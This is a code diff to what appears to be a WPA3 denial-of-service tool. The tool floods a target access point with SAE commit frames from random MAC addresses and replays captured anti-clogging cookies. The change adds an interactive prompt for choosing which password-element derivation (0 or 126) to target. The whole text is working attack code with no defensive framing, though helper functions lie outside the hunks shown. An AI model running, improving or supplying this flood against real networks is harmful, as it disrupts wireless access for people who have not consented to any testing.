@@ -54,7 +54,7 @@ def _track_cookie():
         ap_mac, rand_mac, cookie = output.strip().split("\t")
         cookie_b = bytes.fromhex(cookie.replace(":", ""))
         if rand_mac is not None and cookie is not None:
-            frame_bytes = commit_frame(target_mac=ap_mac, src_mac=rand_mac,cookie=cookie_b)
+            frame_bytes = commit_frame(target_mac=ap_mac, src_mac=rand_mac, cookie=cookie_b, status=pwe)
             transmitData(frame_bytes)
 
     #terminate subprocesses
@@ -89,14 +89,18 @@ def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16, mac_no:int=20
         if i == len(random_macs):
             i = 0
         
-        frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src,cookie=None)
+        frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src,cookie=None, status=pwe)
         transmitData(frame_bytes)
         if src not in specific_frame:
             specific_frame[src] = time.time()
         time.sleep(1/rate)
 
 def start_dos():
+    global pwe
     #start threading
+    print("which password derivation (PWE) do you want to target: (0 or 126)")
+    pwe = int(input("PWE: "))
+
     print("which mac do you want to target (leave empty for default AP MAC): ")
     target = input("MAC: ")
 
